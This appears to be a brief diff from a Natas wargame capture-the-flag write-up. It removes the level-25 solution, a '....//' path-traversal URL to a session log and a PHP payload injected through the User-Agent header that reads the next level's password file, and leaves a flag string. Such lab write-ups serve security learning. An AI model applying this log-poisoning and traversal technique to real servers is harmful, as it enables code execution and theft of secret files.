@@ -1,8 +1,1 @@
-URL:
-...//....//....//....//....//....//....//....//....//var/www/natas/natas25/logs/natas25_<YOUR_PHPSESSID>.log
-
-USER-AGENT:
-<?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
-
-FLAG:
 oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
